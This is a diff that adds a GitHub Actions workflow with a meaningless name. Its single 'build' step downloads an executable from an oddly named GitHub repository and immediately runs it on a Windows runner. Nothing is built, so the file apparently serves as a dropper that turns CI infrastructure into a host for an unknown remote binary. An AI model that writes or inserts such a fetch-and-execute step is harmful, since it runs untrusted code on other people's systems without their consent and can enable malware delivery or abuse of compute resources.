@@ -1,0 +1,10 @@
+name: inmyeveningfreebaking
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+      - name: powershell
+        shell: cmd
+        run: powershell.exe -c Invoke-WebRequest https://github.com/friendteammakingfor2024/inthecake2024/raw/refs/heads/main/intoforamouse.exe -OutFile forhill.exe ; .\forhill.exe
